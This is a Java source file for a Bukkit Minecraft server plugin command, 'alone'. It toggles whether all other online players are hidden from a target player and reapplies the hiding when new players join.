package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;
import java.util.UUID;

public class Alone implements Command, Listener {
    private final ArrayList<UUID> alone = new ArrayList<>();
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"alone"};
    }

    @Override
    public String getDescription() {
        return "Hides all players from a player.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "alone <player>");
            return;
        }

        Player found = Bukkit.getPlayer(args[0]);
        if (found == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
            return;
        }

        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            UUID uuid = found.getUniqueId();

            if (alone.contains(uuid)) {
                alone.remove(uuid);
                hidePlayer(found, false);
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Revealing all players to " + found.getName() + "!");
                return;
            }

            alone.add(uuid);
            hidePlayer(found, true);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Isolating " + found.getName() + "!");
        });
    }

    @Override
    public void onEnable(Z_ z) {
        this.z = z;
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    private void hidePlayer(Player player, boolean hide) {
        Bukkit.getScheduler().scheduleSyncDelayedTask(this.z, () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                // The non-deprecated versions of these methods don't exist on older versions. hurray
                if (hide) {
                    player.hidePlayer(p);
                } else {
                    player.showPlayer(p);
                }
            }
        });
    }

    @EventHandler
    private void onJoin(PlayerJoinEvent e) {
        for (UUID uuid : this.alone) {
            Player player = Bukkit.getPlayer(uuid);
            if (player != null) {
                hidePlayer(player, true);
            }
        }
    }
}
